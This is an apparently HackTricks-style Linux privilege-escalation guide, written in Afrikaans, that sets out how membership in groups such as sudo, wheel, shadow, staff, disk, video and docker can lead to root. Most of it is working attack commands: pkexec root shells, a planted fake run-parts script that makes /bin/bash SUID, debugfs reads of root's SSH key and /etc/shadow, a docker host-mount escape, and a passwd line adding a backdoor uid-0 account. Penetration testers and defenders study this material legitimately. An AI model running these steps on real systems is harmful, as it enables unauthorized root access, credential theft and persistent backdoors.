# Interessante Groepe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin-groepe

### **PE - Method 1**

**Soms** bevat ’n stelsel se **/etc/sudoers**-beleid (of ’n lêer wat daaruit ingesluit word) inskrywings soos:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat enige gebruiker wat deur enige van die twee inskrywings gematch word, enige opdrag as enige teikengebruiker deur `sudo` mag uitvoer (onderhewig aan die res van die beleid).<sup>[[3]](#references)</sup>

As dit die geval is, kan jy **om root te word eenvoudig uitvoer**:
```
sudo su
```
### PE - Metode 2

Vind alle suid binaries en kyk of die binary **Pkexec** daar is:
```bash
find / -perm -4000 2>/dev/null
```
As **pkexec 'n SUID binary** is, kan dit 'n program as 'n ander gebruiker uitvoer slegs wanneer polkit die aangevraagde aksie magtig; die SUID-bit alleen waarborg nie root nie. Kontroleer die geïnstalleerde beleid en die teikensessie se magtiging in plaas daarvan om aan te neem dat lidmaatskap van **sudo** of **admin** voldoende is.<sup>[[4]](#references)[[5]](#references)</sup>

Op verspreidings wat steeds die ouer Local Authority backend gebruik, inspekteer sy groepreëls met:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Die relevante groepname en verstekwaardes verskil volgens verspreiding; ’n groep is slegs hier nuttig as die plaaslike beleid dit benoem.<sup>[[5]](#references)</sup>

Om **root te word, kan jy uitvoer**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **fout**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
In 'n SSH-sessie sonder 'n geregistreerde authentication agent kan `pkexec` met hierdie fout misluk, selfs wanneer die policy andersins die aksie sou toelaat; polkit dokumenteer `pkttyagent` as 'n teksgebaseerde authentication agent vir nie-desktopsessies. Die presiese gedrag is weergawe- en verspreidingsafhanklik, dus moet jy die plaaslike policy en agent-opstelling verifieer. Een workaround wat vir geaffekteerde NixOS-weergawes gerapporteer is, gebruik **2 verskillende SSH-sessies**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

Soms kan ’n sudoers-beleid ook hierdie inskrywing bevat:
```
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat enige gebruiker wat deur die inskrywing gematch word, enige opdrag as enige teikengebruiker deur `sudo` kan uitvoer (onderhewig aan die res van die beleid).<sup>[[3]](#references)</sup>

As dit die geval is, om **root te word, kan jy eenvoudig uitvoer**:
```
sudo su
```
## Shadow Group

Op stelsels waarvan die toestemmings dit toelaat, kan gebruikers in die **shadow**-groep **/etc/shadow** **lees**; verifieer die werklike modus en ACL's op die teiken:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Lees dus die lêer en probeer om **sommige hashes te crack**.

’n Belangrike nuanse oor die lock-state wanneer hashes getriage word:
- Inskrywings met `!` of `*` is oor die algemeen nie-interaktief vir password logins nie.
- `!hash` beteken dat die password gelock is; die oorblywende karakters verteenwoordig die password-field voordat dit gelock is.
- ’n Field wat `*` bevat, is nie ’n geldige `crypt(3)`-hash nie en voorkom UNIX-password login; moenie daaruit aflei of ’n password voorheen gestel is nie.
Dit is nuttig vir account classification, selfs wanneer direkte login geblokkeer word.<sup>[[6]](#references)</sup>

## Staff-groep

**staff**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) te maak sonder root privileges (let daarop dat executables in `/usr/local/bin` in die PATH-variable van enige gebruiker is, en dat hulle die executables in `/bin` en `/usr/bin` met dieselfde naam kan “override”). Vergelyk dit met group “adm”, wat meer met monitoring/security verband hou.<sup>[[2]](#references)[[7]](#references)</sup>

Op Debian-configurations waar `/usr/local/bin` voor `/usr/bin` in `PATH` kom (soos in die voorbeelde hieronder), resolve ’n unqualified command eerste na die copy in `/usr/local/bin`; bevestig die effektiewe `PATH` op die target.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
As ’n bevoorregte proses ’n ongekwalifiseerde opdrag deur ’n skryfbare `/usr/local/bin` oplos, kan die vervanging van daardie opdrag dit met die proses se voorregte laat uitvoer; bevestig die werklike pad en sneller voordat jy toets.

Op Ubuntu-stelsels voer `pam_motd` uitvoerbare scripts via `run-parts --lsbsysinit` as root tydens aanmelding uit; cron-take kan ook `run-parts` gebruik, maar dit is verspreidings- en konfigurasiespesifiek.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Met 'n nuwe SSH-aanmelding kan `pspy` help bevestig of hierdie pad werklik op die teiken aangeroep word; dit kan prosesopdraglyne sonder root waarneem.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Lidmaatskap van die **disk**-groep kan rou toegang tot bloktoestelle verleen en is dikwels **naby aan root access**; Debian beskryf dit as grootliks gelykstaande aan root, maar verifieer die werklike toesteltoestemmings en stoorrangskikking op die teiken.<sup>[[7]](#references)</sup>

Algemene toestelpaadjies sluit `/dev/sd*` in, maar NVMe en ander stoorrangskikkings gebruik verskillende name.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` werk op ext2/ext3/ext4-lêerstelsels; paaie soos `/root` en `/etc/shadow` hierbo is lêers binne die oopgemaakte lêerstelsel, terwyl die tweede argument vir `dump` ’n uitvoerpad op die inheemse lêerstelsel is.<sup>[[8]](#references)</sup> Byvoorbeeld, dit onttrek `/tmp/asd1.txt` uit die oopgemaakte lêerstelsel na `/tmp/asd2.txt` op die inheemse lêerstelsel:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Die `-w`-opsie maak die lêerstelsel lees-skryf oop, en die `write`-opdrag kopieer ’n native-lêer na die oopgemaakte lêerstelsel. Vermy die gebruik daarvan op ’n gemonteerde aktiewe lêerstelsel, omdat direkte wysigings die lêerstelsel kan beskadig; werk waar moontlik vanaf ’n offline-beeld.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Video-groep

Met die opdrag `w` kan jy vind **wie by die stelsel aangemeld is**, en dit sal uitvoer soos die volgende een vertoon.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1**-inskrywing identifiseer die eerste Linux-virtuele konsole; dit bewys nie op sigself dat ’n gebruiker fisies by die masjien teenwoordig is nie, veral in houers of ander omgewings nie.<sup>[[21]](#references)</sup>

Op stelsels wat ’n leesbare framebuffer-device blootstel, kan lidmaatskap van die **video**-groep toegang tot daardie device verleen. Die Linux framebuffer-koppelvlak dokumenteer `/dev/fb0` as ’n leesbare geheue-device wat gekopieer kan word om ’n skermkiekie te maak; die `/sys/class/graphics/fb0/virtual_size`-pad is slegs beskikbaar waar daardie fbdev sysfs-kenmerk teenwoordig is, dus moet die teiken eers nagegaan word.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
As die geïnstalleerde **GIMP**-weergawe ’n raw-data-invoerder beskikbaar stel, maak **`screen.raw`** met daardie invoerder oop; ondersteuning en kontroles verskil volgens weergawe en plug-in.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Om die raw-beeld oop te maak, kan jy GIMP gebruik, die screen.raw-lêer kies en Raw image data as lêertipe kies](<../../../images/image (463).png>)

Stel die beeld se Width en Height om by die framebuffer-geometrie te pas; probeer die beskikbare pixel-formate/Image Types totdat die uitvoer leesbaar is.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Verander vervolgens die Width en Height na dié wat op die skerm gebruik word en toets verskillende Image Types (en kies die een wat die skerm die beste vertoon)](<../../../images/image (317).png>)

## Root-groep

Lidmaatskap van die **root**-groep verskaf nie root se UID nie, maar groep-skryfbare lêers wat deur `root` besit word, kan steeds interessant wees wanneer bevoorregte dienste of libraries dit gebruik. Verifieer die lêer se werklike toestemmings en hoe dit gebruik word voordat jy dit as ’n privilege-escalation-pad beskou.

**Kontroleer watter lêers root-lede kan wysig**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Lidmaatskap van die `docker`-groep verleen toegang op wortelvlak tot die Docker-daemon op standaard rootful-installasies. Omdat bind mounts by verstek lees-skryf is, kan 'n gebruiker wat daardie daemon kan beheer die gasheer se `/` in 'n container mount en gasheerlêers wysig; dit gee die gebruiker effektief root-toegang op die gasheer.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Uiteindelik, indien jy nie van enige van die bogenoemde voorstelle hou nie, of indien hulle om een of ander rede nie werk nie (docker api firewall?), kan jy altyd probeer om **'n privileged container te run en daaruit te escape** soos hier verduidelik word:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Indien jy skryftoestemmings oor die docker socket het, lees [**hierdie plasing oor hoe om privileges te eskaleer deur die docker socket te misbruik**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

Gewoonlik het **members** van die groep **`adm`** toestemmings om **log**-lêers te **lees** wat binne _/var/log/_ geleë is.\
Daarom, indien jy 'n gebruiker binne hierdie groep gekompromitteer het, moet jy beslis **na die logs kyk**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Hierdie groepe het diens- en distribution-spesifieke betekenisse. Debian dokumenteer `backup` vir gedelegeerde backup/restore, `lp` vir printer daemons, en `mail` vir `/var/mail`, dus moet jy plaaslike toestemmings nagaan voordat jy lidmaatskap as 'n privilege path beskou.<sup>[[7]](#references)</sup>

Hulle is dikwels **credential-discovery**-vektore eerder as direkte root-vektore:
- **backup**: kan archives met configs, keys, DB dumps of tokens blootlê.
- **operator**: platform-spesifieke operasionele toegang wat sensitiewe runtime-data kan leak.
- **lp**: print queues/spools kan dokumentinhoud bevat.
- **mail**: mail spools kan reset links, OTPs en interne credentials blootlê.

Behandel lidmaatskap hier as 'n hoëwaarde-data-blootstellingsbevinding en pivot deur password/token-hergebruik.

## Auth group

Op OpenBSD, wanneer S/Key gekonfigureer is, word `/etc/skey` deur `root:auth` besit en vereis toegang tot die rekords groep `auth`; YubiKey-rekords word in `/var/db/yubikey` gestoor.<sup>[[16]](#references)[[17]](#references)</sup> 'n Kwesbare OpenBSD 6.6-konfigurasie met S/Key of YubiKey geaktiveer het plaaslike gebruikers met `auth`-privileges toegelaat om root te word; Qualys dokumenteer die voorvereiste en exploit chain, en die gekoppelde PoC implementeer dit.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [pkexec/pkttyagent authentication sonder 'n GUI-sessie (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux-handleidingsblad](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Handleiding vir die beveiliging van Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux-handleidingsblad](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Die Frame Buffer Device — Die Linux Kernel-dokumentasie](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [Manage Docker as a non-root user](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Running containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [Authentication vulnerabilities in OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux-handleidingsblad](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
